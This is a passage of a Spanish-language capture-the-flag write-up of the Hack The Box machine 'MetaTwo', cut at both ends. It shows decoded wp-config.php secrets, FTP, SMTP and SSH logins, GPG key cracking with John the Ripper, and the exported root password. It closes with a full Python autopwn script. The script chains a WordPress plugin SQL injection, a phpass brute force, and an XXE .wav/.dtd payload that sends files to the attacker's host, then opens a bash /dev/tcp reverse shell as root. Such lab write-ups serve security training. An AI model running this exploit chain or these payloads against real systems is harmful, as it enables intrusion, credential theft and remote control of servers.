KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== HTTP/1.1&quot; 200 -10.10.11.186 - - [16/Nov/2022 16:39:18] &quot;GET /poc.dtd HTTP/1.1&quot; 200 -. . .Desencriptamos la data en base64 y conseguimos el archivo wp-config.php:&amp;lt;?php/** The name of the database for WordPress */define( &#39;DB_NAME&#39;, &#39;blog&#39; );/** MySQL database username */define( &#39;DB_USER&#39;, &#39;blog&#39; );/** MySQL database password */define( &#39;DB_PASSWORD&#39;, &#39;635Aq@TdqrCwXFUZ&#39; );/** MySQL hostname */define( &#39;DB_HOST&#39;, &#39;localhost&#39; );/** Database Charset to use in creating database tables. */define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );/** The Database Collate type. Don&#39;t change this if in doubt. */define( &#39;DB_COLLATE&#39;, &#39;&#39; );define( &#39;FS_METHOD&#39;, &#39;ftpext&#39; );define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; );define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; );define( &#39;FTP_HOST&#39;, &#39;ftp.metapress.htb&#39; );define( &#39;FTP_BASE&#39;, &#39;blog/&#39; );define( &#39;FTP_SSL&#39;, false );/**#@+ * Authentication Unique Keys and Salts. * @since 2.6.0 */define( &#39;AUTH_KEY&#39;, &#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&amp;gt;+3m?.B/:&#39; );define( &#39;SECURE_AUTH_KEY&#39;, &#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%&#39; );define( &#39;LOGGED_IN_KEY&#39;, &#39;J+mxCaP4z&amp;lt;g.6P^t`ziv&amp;gt;dd}EEi%48%JnRq^2MjFiitn#&amp;amp;n+HXv]||E+F~C{qKXy&#39; );define( &#39;NONCE_KEY&#39;, &#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5&#39; );define( &#39;AUTH_SALT&#39;, &#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&amp;lt;~:0]s}d&amp;lt;&amp;amp;M;.,x0z~R&amp;gt;3!D&#39; );define( &#39;SECURE_AUTH_SALT&#39;, &#39;&amp;gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;amp;~omiH^jVC?2-I?I.&#39; );define( &#39;LOGGED_IN_SALT&#39;, &#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;amp;^JsI`M)FJTJEVI) N#NOidIf=&#39; );define( &#39;NONCE_SALT&#39;, &#39;.sU&amp;amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL&#39; );/** * WordPress Database Table prefix. */$table_prefix = &#39;wp_&#39;;/** * For developers: WordPress debugging mode. * @link https://wordpress.org/support/article/debugging-in-wordpress/ */define( &#39;WP_DEBUG&#39;, false );/** Absolute path to the WordPress directory. */if ( ! defined( &#39;ABSPATH&#39; ) ) { define( &#39;ABSPATH&#39;, __DIR__ . &#39;/&#39; );}/** Sets up WordPress vars and included files. */require_once ABSPATH . &#39;wp-settings.php&#39;;Observamos unas posibles credenciales de FTP, y recordando que teniamos el puerto 21(FTP) logramos conectarnos:❯ ftp 10.10.11.186 21Connected to 10.10.11.186.220 ProFTPD Server (Debian) [::ffff:10.10.11.186]Name (10.10.11.186:potro): metapress.htb331 Password required for metapress.htbPassword: 230 User metapress.htb logged inRemote system type is UNIX.Using binary mode to transfer files.ftp&amp;gt; ls -l229 Entering Extended Passive Mode (|||60192|)150 Opening ASCII mode data connection for file listdrwxr-xr-x 5 metapress.htb metapress.htb 4096 Oct 5 14:12 blogdrwxr-xr-x 3 metapress.htb metapress.htb 4096 Oct 5 14:12 mailer226 Transfer completeftp&amp;gt; cd mailer250 CWD command successfulftp&amp;gt; ls -la229 Entering Extended Passive Mode (|||6925|)150 Opening ASCII mode data connection for file listdrwxr-xr-x 3 metapress.htb metapress.htb 4096 Oct 5 14:12 .drwxr-xr-x 4 0 metapress.htb 4096 Oct 5 14:12 ..drwxr-xr-x 4 metapress.htb metapress.htb 4096 Oct 5 14:12 PHPMailer-rw-r--r-- 1 metapress.htb metapress.htb 1126 Jun 22 18:32 send_email.php226 Transfer completeftp&amp;gt; get send_email.phplocal: send_email.php remote: send_email.php229 Entering Extended Passive Mode (|||64863|)150 Opening BINARY mode data connection for send_email.php (1126 bytes)100% |**********************************************************************************************************************************************| 1126 14.12 MiB/s 00:00 ETA226 Transfer completeConseguimos descargar el archivo send_email.php en el cúal se encontraban las credenciales del servicio PHPMailer del un usuario jnelson:Cb4_JmWM8zUZWMu@Ys:&amp;lt;?php/* * This script will be used to send an email to all our users when ready for launch*/use PHPMailer\\PHPMailer\\PHPMailer;use PHPMailer\\PHPMailer\\SMTP;use PHPMailer\\PHPMailer\\Exception;require &#39;PHPMailer/src/Exception.php&#39;;require &#39;PHPMailer/src/PHPMailer.php&#39;;require &#39;PHPMailer/src/SMTP.php&#39;;$mail = new PHPMailer(true);$mail-&amp;gt;SMTPDebug = 3; $mail-&amp;gt;isSMTP(); $mail-&amp;gt;Host = &quot;mail.metapress.htb&quot;;$mail-&amp;gt;SMTPAuth = true; $mail-&amp;gt;Username = &quot;jnelson@metapress.htb&quot;; $mail-&amp;gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;; $mail-&amp;gt;SMTPSecure = &quot;tls&quot;; $mail-&amp;gt;Port = 587; $mail-&amp;gt;From = &quot;jnelson@metapress.htb&quot;;$mail-&amp;gt;FromName = &quot;James Nelson&quot;;$mail-&amp;gt;addAddress(&quot;info@metapress.htb&quot;);$mail-&amp;gt;isHTML(true);$mail-&amp;gt;Subject = &quot;Startup&quot;;$mail-&amp;gt;Body = &quot;&amp;lt;i&amp;gt;We just started our new blog metapress.htb!&amp;lt;/i&amp;gt;&quot;;try { $mail-&amp;gt;send(); echo &quot;Message has been sent successfully&quot;;} catch (Exception $e) { echo &quot;Mailer Error: &quot; . $mail-&amp;gt;ErrorInfo;}Finalmente el usuario jnelson rehusó estas credenciales y por ello conseguimos entrar por el puerto 22(SSH) y conseguir la flag:❯ ssh jnelson@10.10.11.186jnelson@10.10.11.186&#39;s password: Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Nov 16 19:19:40 2022 from 10.10.14.50jnelson@meta2:~$ find / -name user.txt -exec ls -l {} + 2&amp;gt;/dev/null-rw-r----- 1 root jnelson 33 Nov 16 17:08 /home/jnelson/user.txtPrivilege EscalationEn el proceso de una enumeración básica por el sistema, encontramos en nuestra de usuario el archivo .passpie. Investigando encontramos que Passpie es una herramienta de línea de comandos para administrar contraseñas desde el terminal:jnelson@meta2:~$ passpie ╒════════╤═════════╤════════════╤═══════════╕│ Name │ Login │ Password │ Comment │╞════════╪═════════╪════════════╪═══════════╡│ ssh │ jnelson │ ******** │ │├────────┼─────────┼────────────┼───────────┤│ ssh │ root │ ******** │ │╘════════╧═════════╧════════════╧═══════════╛ Passpie documentation: https://passpie.readthedocs.io/en/latest/getting_started.htmlListamos todos los archivos:jnelson@meta2:~$ ls -laR .passpie/.passpie/:total 24dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .drwxr-xr-x 5 jnelson jnelson 4096 Nov 16 22:13 ..-r-xr-x--- 1 jnelson jnelson 3 Jun 26 13:57 .config-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .keysdr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh.passpie/ssh:total 16dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 .dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 ..-r-xr-x--- 1 jnelson jnelson 683 Oct 25 12:52 jnelson.pass-r-xr-x--- 1 jnelson jnelson 673 Oct 25 12:52 root.passComo es mi primera vez viendo este programa tuve que leer la documentación y encontre algo interesante:Entonces teniendo esta “llave” podremos obtener las credenciales que listamos anteriormente. Para ello, traemos estas llaves a nuestra máquina para poder crackearlas: Ya que ambas llaves (pública / privada) vienen en un mismo archivo, las separamos y trabajamos con la privada❯ head passpie_private_gnupg-----BEGIN PGP PRIVATE KEY BLOCK-----lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpTZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHVgNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEptQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb❯ gpg2john passpie_private_gnupg &amp;gt; passpie_private_gnupg_hashFile passpie_private_gnupg❯ john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt passpie_private_gnupg_hashUsing default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 65011712 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashesWill run 3 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusblink182 (Passpie) 1g 0:00:00:05 DONE (2022-11-16 17:31) 0.1972g/s 32.54p/s 32.54c/s 32.54C/s peanut..sweetieAhora solo exportamos las credenciales de la base de datos passpie en un archivo especificado:jnelson@meta2:~$ passpie export user_credentialsPassphrase: jnelson@meta2:~$ cat user_credentials credentials:- comment: &#39;&#39; fullname: root@ssh login: root modified: 2022-06-26 08:58:15.621572 name: ssh password: !!python/unicode &#39;p7qfAZt4_A1xo_0x&#39;- comment: &#39;&#39; fullname: jnelson@ssh login: jnelson modified: 2022-06-26 08:58:15.514422 name: ssh password: !!python/unicode &#39;Cb4_JmWM8zUZWMu@Ys&#39;handler: passpieversion: 1.0Por último, hacemos un pivoting al usuario root y conseguimos la última flag:jnelson@meta2:~$ su rootPassword: root@meta2:/home/jnelson# find / -name root.txt -exec ls -l {} \\;-rw-r----- 1 root root 33 Nov 16 17:08 /root/root.txtA modo de práctica hice un script en python para automatizar todo el proceso:#!/usr/env/bin python3&quot;&quot;&quot;Metatwo Autopwn HTB-------------------Author: MarssDate: 10 Nov, 2022&quot;&quot;&quot;import pdbimport argparseimport base64import gzipimport osimport paramikoimport reimport requestsimport shleximport signalimport socketimport subprocessimport sysimport threadingfrom ftplib import FTPfrom passlib.hash import phpassfrom pwn import *from threading import Thread## Ctrl + c# (function)def signal_handler(signum, frame): sys.exit(&quot;\\n[!] User terminated.&quot;)# (signal)signal.signal(signal.SIGINT, signal_handler)## Main classclass Exploit: def __init__(self, args): &quot;&quot;&quot; Initialize variables to all process: Remember add metapress.htb domain to /etc/hosts &quot;&quot;&quot; self.target_host = { &#39;ip_address&#39; : &#39;10.10.11.186&#39;, &#39;url_domain&#39; : &#39;http://metapress.htb&#39; } self.ip_address = args.ip self.port = args.port self.compressed_wordlist = &#39;rockyou.txt.gz&#39; self.credentials = {} self.stop_threads = False self.wav_file_name = &#39;malicious.wav&#39; self.dtd_file_name = &#39;malicious.dtd&#39; self.log_file_name = &#39;xxe_request.log&#39; self.exposed_ftp_file = &#39;send_email.php&#39; self.passpie_keys_file = &#39;passpie_keys&#39; self.passpie_private_key = &#39;passpie_private_key&#39; def run(self): &quot;&quot;&quot; Exploit process: (1) Bookpress plugin [CVE-2022-0739] (Unauthenticated SQL injection) * Wordpress manager user credentials * Decrypt manager password [Bruteforce] (2) Media library [CVE-2021-29447] (Authenticated XXE [PHP 8]) * wp-config.php: metapress.htb FTP credentials (3) FTP login (Leakage Information) * send_email.php: jnelson PHPMailer credentials (4) SSH login (Reused Credentials) * Crack GPG keys of Password Manager [passpie] * Export encrypted credentials in plaintext (5) Pivot to root user * Send reverse shell ? &quot;&quot;&quot; with log.progress(&#39;Starting Attack&#39;) as progress: progress.status(&#39;Unauthenticated SQL injection (CVE-2022-0739)&#39;); time.sleep(2) manager_password_hash = self.sql_injection() log.info(&#39;extracted manager user password hash (CVE-2022-0739)&#39;) progress.status(&#39;Starting Brute-force attack&#39;); time.sleep(2) with log.progress(&#39;Cracking password&#39;) as progress_2: self.bruteforce_attack(manager_password_hash, self.get_wordlist(), progress_2) log.success(&#39;manager password -&amp;gt; {}&#39;.format(self.credentials[&#39;manager&#39;])) progress.status(&#39;Authenticated XXE [PHP 8] (CVE-2021-29447)&#39;); time.sleep(2) self.create_xxe_files(target_file_path=&quot;../wp-config.php&quot;) log.info(&#39;malicious XXE files created : {}, {} (CVE-2021-29447)&#39;.format(self.wav_file_name, self.dtd_file_name)) progress.status(&#39;Uploading .wav file to receive wp-config.php&#39;); time.sleep(2) self.wordpress_authentication() log.info(&#39;xxe attack requests log file : {}&#39;.format(self.log_file_name)) progress.status(&#39;Extracting FTP credentials of log_file&#39;); time.sleep(2) self.extract_ftp_credentials() log.success(&#39;ftp credentials -&amp;gt; {}:{} (Leakage Information)&#39;.format(self.credentials[&#39;ftp_user&#39;], self.credentials[&#39;ftp_pass&#39;])) progress.status(&#39;FTP logging to extract SSH credentials from exposed file ({})&#39;.format(self.exposed_ftp_file)); time.sleep(2) self.ftp_login() log.success(&#39;ssh credentials -&amp;gt; {}:{} (Reused Credentials)&#39;.format(self.credentials[&#39;ssh_user&#39;], self.credentials[&#39;ssh_pass&#39;])) progress.status(&#39;SSH loggin to extract GPG keys of Password Manager (passpie)&#39;); time.sleep(2) self.download_keys_file( ssh_client=self.ssh_connection( self.credentials[&#39;ssh_user&#39;], self.credentials[&#39;ssh_pass&#39;] ) ) log.info(&#39;extracted gpg keys file : {}&#39;.format(self.passpie_keys_file)) progress.status(&#39;Extracting private key of gpg key file&#39;); time.sleep(2) self.extract_pgp_private_key() log.info(&#39;gpg private key file : {}&#39;.format(self.passpie_private_key)) progress.status(&#39;Cracking gpg private key with John the Ripper&#39;); time.sleep(2) self.crack_gpg_key() log.success(&#39;cracked passpie password -&amp;gt; {}&#39;.format(self.credentials[&#39;passpie_pass&#39;])) progress.status(&#39;SSH login to extract root password&#39;); time.sleep(2) self.extract_root_pass( ssh_client=self.ssh_connection( self.credentials[&#39;ssh_user&#39;], self.credentials[&#39;ssh_pass&#39;] ) ) log.success(&#39;extracted root password -&amp;gt; {}&#39;.format(self.credentials[&#39;root_pass&#39;])) progress.status(&#39;Running reverse shell as root user to get a shell&#39;); time.sleep(2) self.get_shell() def extract_wp_nonce(self, response, nonce_type): try: if nonce_type == 1: return re.findall(&quot;_wpnonce:&#39;(.*?)&#39;&quot;, response.text)[0] elif nonce_type == 2: return re.findall(&#39;&quot;_wpnonce&quot;:&quot;(.*?)&quot;&#39;, response.text)[0] except Exception as error: sys.exit(&quot;\\n[X] Error: %s&quot; % error) def sql_injection(self): try: response = requests.get(self.target_host[&#39;url_domain&#39;] + &#39;/events/&#39;) wp_nonce = self.extract_wp_nonce(response, 1) post_data = { &#39;action&#39; : &#39;bookingpress_front_get_category_services&#39;, &#39;_wpnonce&#39; : wp_nonce, &#39;category_id&#39; : &#39;1&#39;, &#39;total_service&#39; : &#39;-1) union select 1,2,3,4,5,6,7,8,group_concat(0x7c, user_pass, 0x7c) from wp_users#&#39; } response = requests.post(self.target_host[&#39;url_domain&#39;] + &#39;/wp-admin/admin-ajax.php&#39;, data=post_data) manager_password_hash = re.findall(&quot;\\|(.*?)\\|&quot;, response.text)[1] return manager_password_hash except Exception as error: sys.exit(&#39;\\n[X] Error: %s&#39; % error) def get_wordlist(self): with gzip.open(self.compressed_wordlist, mode=&#39;rt&#39;, errors=&#39;replace&#39;) as file: # errors=&#39;replace&#39; (UnicodeDecodeError) wordlist = file.readlines() return wordlist def divide_wordlist(self, wordlist, wordlist_len): &quot;&quot;&quot; yield: keyword to return a value like any function but in its next execution it will start from its last call &quot;&quot;&quot; for i in range(0, len(wordlist), wordlist_len): yield wordlist[i:i + wordlist_len] def bruteforce_attack(self, password_hash, complete_wordlist, progress_log): &quot;&quot;&quot; Thread implementation Split wordlist into subwordlists based on number of threads &quot;&quot;&quot; num_threads = 50 # testing 50 (1:58) wordlist_list = list(self.divide_wordlist(complete_wordlist, (len(complete_wordlist) // num_threads))) password_hash = password_hash.replace(&quot;\\/&quot;, &quot;/&quot;) # remove escape character rounds, salt = self.extract_hash_parts(password_hash) threads_list = [] # add each sublist to thread list for sub_wordlist in wordlist_list: threads_list.append( Thread( target=self.decrypt_password_hash, args=(password_hash, rounds, salt, sub_wordlist, progress_log) )) # start list threads for thread in threads_list: thread.start() # waits for threads to terminate for thread in threads_list: thread.join() def extract_hash_parts(self, password_hash): &quot;&quot;&quot; $P$ B 4aNM28N0 E.tMy/JIcnVMZbGcU16Q70 {prefix} {rounds} {salt} {checksum} 1 ch 8 ch 22 ch &quot;&quot;&quot; rounds = int(password_hash[3], base=16) + 2 # encoding a 6-bit integer salt = password_hash[4:12] return rounds, salt def decrypt_password_hash(self, password_hash, rounds, salt, sub_wordlist, progress_log): try: for word in sub_wordlist: if self.stop_threads: break progress_log.status(word.strip()) _hash = phpass.hash(word.strip(), salt=salt, rounds=rounds) if _hash == password_hash: self.credentials[&#39;manager&#39;] = word.strip() self.stop_threads = True break except Exception as error: sys.exit(&quot;\\n[X] Error: %s&quot; % error) def create_xxe_files(self, target_file_path): &quot;&quot;&quot; (1) .wav file (2) .dtd file &quot;&quot;&quot; # (1) wav_file_content = &quot;RIFFXXXXWAVEiXMLBBBB&amp;lt;?xml version=\\&quot;1.0\\&quot;?&amp;gt;&amp;lt;!DOCTYPE r [\\n&amp;lt;!ELEMENT r ANY &amp;gt;\\n&amp;lt;!ENTITY % sp SYSTEM \\&quot;http://{}:{}/{}\\&quot;&amp;gt;\\n%sp;\\n%param1;\\n]&amp;gt;\\n&amp;lt;r&amp;gt;&amp;amp;exfil;&amp;lt;/r&amp;gt;&amp;gt;&quot; \\ .format(self.ip_address, self.port, self.dtd_file_name) with open(self.wav_file_name, &quot;wb&quot;) as file: file.write(wav_file_content.encode()) # extrac file size wav_file_object = os.stat(self.wav_file_name) wav_size_bytes = wav_file_object.st_size # calcule bytes of xml payload (important to work!) little_endian_bytes = chr(wav_size_bytes - 20) + &quot;\\x00\\x00&quot; # 0xc2 added (weird behavior) ? wav_file_content = wav_file_content.replace(&quot;BBBB&quot;, little_endian_bytes) with open(self.wav_file_name, &quot;wb&quot;) as file: file.write(wav_file_content.encode()) # (2) dtd_file_content = &quot;&amp;lt;!ENTITY % data SYSTEM \\&quot;php://filter/read=convert.base64-encode/resource={}\\&quot;&amp;gt;\\n&amp;lt;!ENTITY % param1 \\&quot;&amp;lt;!ENTITY exfil SYSTEM &#39;http://{}:{}/?=%data;&#39;&amp;gt;\\&quot;&amp;gt;&quot; \\ .format(target_file_path, self.ip_address, self.port) with open(self.dtd_file_name, &quot;wt&quot;) as file: file.write(dtd_file_content) def share_server(self): &quot;&quot;&quot; Create server with python to receive XXE response (wp-config.php) and save into a log file &quot;&quot;&quot; with open(self.log_file_name, &#39;wt&#39;) as log_file: command = &quot;python3 -m http.server {}&quot;.format(self.port) python_server = subprocess.Popen(shlex.split(command), stdout=log_file, stderr=log_file) return python_server def wordpress_authentication(self): &quot;&quot;&quot; (1) Login with manager credentials (2) Upload malicious .wav file &quot;&quot;&quot; try: with requests.Session() as session: # (1) headers = { &#39;Content-type&#39; : &#39;application/x-www-form-urlencoded&#39; } form_data = { &#39;log&#39; : list(self.credentials.keys())[0], &#39;pwd&#39; : self.credentials[&#39;manager&#39;], &#39;wp-submit&#39; : &#39;Log+In&#39; } session.post(self.target_host[&#39;url_domain&#39;] + &#39;/wp-login.php&#39;, headers=headers, data=form_data) # (2) file_data = { &#39;async-upload&#39; : ( self.wav_file_name, open(self.wav_file_name, &#39;rb&#39;), &#39;audio/wav&#39; ), } response = session.get(self.target_host[&#39;url_domain&#39;] + &#39;/wp-admin/media-new.php&#39;) wp_nonce = self.extract_wp_nonce(response, 2) form_data = { &#39;_wpnonce&#39; : wp_nonce } # implement subprocess to receive log requests server_process = self.share_server() # upload file session.post(self.target_host[&#39;url_domain&#39;] + &#39;/wp-admin/async-upload.php&#39;, files=file_data, data=form_data) # terminate process server_process.kill() except Exception as error: sys.exit(&#39;\\n[X] Error: %s&#39; % error) def extract_ftp_credentials(self): with open(self.log_file_name, &#39;rt&#39;) as log_file: log_content = log_file.readlines() # extract base64 content of log file base64_content = re.findall(&quot;GET /\\?=(.*?) HTTP/1.1&quot;, log_content[1])[0] # decode base64 content base64_bytes = base64_content.encode(&#39;ascii&#39;) content_bytes = base64.b64decode(base64_bytes) plaintext_content = content_bytes.decode(&#39;ascii&#39;) # get ftp credentials self.credentials[&#39;ftp_user&#39;] = re.findall(&quot;&#39;FTP_USER&#39;, &#39;(.*?)&#39;&quot;, plaintext_content)[0] self.credentials[&#39;ftp_pass&#39;] = re.findall(&quot;&#39;FTP_PASS&#39;, &#39;(.*?)&#39;&quot;, plaintext_content)[0] def ftp_login(self): &quot;&quot;&quot; Login to ftp and download send_mailer.php and extract jnelson credentials &quot;&quot;&quot; try: ftp_session = FTP(&#39;metapress.htb&#39;, user=self.credentials[&#39;ftp_user&#39;], passwd=self.credentials[&#39;ftp_pass&#39;]) with open(self.exposed_ftp_file, &#39;wb&#39;) as file: ftp_session.retrbinary(f&quot;RETR /mailer/{self.exposed_ftp_file}&quot;, file.write) with open(self.exposed_ftp_file, &#39;r&#39;) as ftp_file: ftp_content = ftp_file.read() self.credentials[&#39;ssh_user&#39;] = re.findall(&quot;\\$mail-&amp;gt;Username = \\&quot;(.*?)\\&quot;&quot;, ftp_content)[0].split(&quot;@&quot;)[0] self.credentials[&#39;ssh_pass&#39;] = re.findall(&quot;\\$mail-&amp;gt;Password = \\&quot;(.*?)\\&quot;&quot;, ftp_content)[0] except Exception as error: sys.exit(&#39;\\n[X] Error: %s&#39; % error) def download_keys_file(self, ssh_client): &quot;&quot;&quot; SSH connection like jnelson to extract passpie .keys file &quot;&quot;&quot; with ssh_client.open_sftp() as sftp_client: sftp_client.get(&quot;/home/jnelson/.passpie/.keys&quot;, f&quot;./{self.passpie_keys_file}&quot;) ssh_client.close() def ssh_connection(self, ssh_user, ssh_pass): &quot;&quot;&quot; SSH connection like a user &quot;&quot;&quot; try: ssh_client = paramiko.SSHClient() ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh_client.connect(self.target_host[&#39;ip_address&#39;], port=22, username=ssh_user, password=ssh_pass) return ssh_client except Exception as error: sys.exit(&#39;\\n[X] Error: %s&#39; % error) def extract_pgp_private_key(self): with open(self.passpie_keys_file, &quot;rt&quot;) as keys_file: keys_file_content = keys_file.read() passpie_private_key_content = re.findall(&quot;(?s)-----BEGIN .+?-----.+?-----END .+?-----\\n&quot;, keys_file_content)[1] with open(self.passpie_private_key, &quot;wt&quot;) as key_file: key_file.write(passpie_private_key_content) def crack_gpg_key(self): try: # create gpg hash with john command = &#39;gpg2john passpie_private_key &amp;gt; passpie_private_key_hash&#39; crack_process = subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True) # crack gpg hash command = &#39;john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt passpie_private_key_hash&#39; john_output = subprocess.run(command, capture_output=True, shell=True) # extract passpie password if &quot;No password hashes left to crack (see FAQ)&quot; in john_output.stdout.decode(): # if has been cracked before john_output = subprocess.run(&quot;john --show passpie_private_key_hash&quot;, capture_output=True, shell=True) self.credentials[&#39;passpie_pass&#39;] = re.findall(&quot;(Passpie:.*):::&quot;, john_output.stdout.decode())[0].split(&#39;:&#39;)[1] return # first time cracking self.credentials[&#39;passpie_pass&#39;] = re.findall(&quot;(.*?)\\s+\\(Passpie\\)&quot;, john_output.stdout.decode())[0] except Exception as error: sys.exit(&#39;\\n[X] Error: %s&#39; % error) def extract_root_pass(self, ssh_client): &quot;&quot;&quot; SSH connection like jnelson to export users credentials in plaintext &quot;&quot;&quot; with ssh_client as ssh_client: # create personal workstation ssh_client.exec_command(&quot;mkdir -p /tmp/.{}&quot;.format(self.ip_address)) # save credentials _stdin, _stdout, _stderr = ssh_client.exec_command(&quot;passpie export /tmp/.{}/user_credentials&quot;.format(self.ip_address)) _stdin.write(self.credentials[&#39;passpie_pass&#39;] + &quot;\\n&quot;) _stdin.flush() # wait until the file is created time.sleep(5) # open credentials file and extract root password _stdin, _stdout, _stderr = ssh_client.exec_command(&quot;cat /tmp/.{}/user_credentials&quot;.format(self.ip_address)) self.credentials[&#39;root_pass&#39;] = re.findall(&quot;password: .*? &#39;(.*?)&#39;\\s&quot;, _stdout.read().decode())[0] # remove personal workstation ssh_client.exec_command(&quot;rm -r /tmp/.{}&quot;.format(self.ip_address)) def get_shell(self): &quot;&quot;&quot; Send reverse shell to local machine &quot;&quot;&quot; try: ssh_client = self.ssh_connection(self.credentials[&#39;ssh_user&#39;], self.credentials[&#39;ssh_pass&#39;]) reverse_shell = &quot;su root -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/{}/{} 0&amp;gt;&amp;amp;1&#39;&quot;.format(self.ip_address, self.port) _stdin, _stdout, _stderr = ssh_client.exec_command(reverse_shell) _stdin.write(self.credentials[&#39;root_pass&#39;] + &#39;\\n&#39;) _stdin.flush() shell = listen(self.port, timeout=20).wait_for_connection() if shell.sock: log.info(&#39;Press Ctrl + D to exit.&#39;) shell.interactive() except Exception as error: sys.exit(&#39;\\n[X] Error: %s&#39; % error)## Main flowif __name__ == &#39;__main__&#39;: ascii_title = &quot;&quot;&quot; |\\/| _ _|_ _. _|_ _ /\\ _|_ _ ._ ._ | | (/_ |_ (_| |_ \\/\\/ (_) /--\\ |_| |_ (_) |_) \\/\\/ | | | by marss &quot;&quot;&quot; parser = argparse.ArgumentParser( description=ascii_title, formatter_class=argparse.RawDescriptionHelpFormatter, epilog=&quot;&quot;&quot;Example: 